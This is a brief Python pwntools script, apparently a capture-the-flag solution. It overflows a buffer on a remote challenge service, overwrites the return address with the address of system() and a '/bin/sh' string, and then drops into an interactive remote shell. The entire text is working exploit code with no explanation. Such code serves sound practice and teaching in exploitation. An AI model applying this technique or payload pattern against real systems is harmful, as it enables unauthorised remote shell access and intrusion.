from pwn import *

io = remote("pwn.challenge.ctf.show", "28241")
offset = 22

binsh_addr = 0x08048750
system_addr = 0x080483a0
payload = offset * b'a' + p32(system_addr) +b'bbbb'+ p32(binsh_addr)
io.sendline(payload)
io.interactive()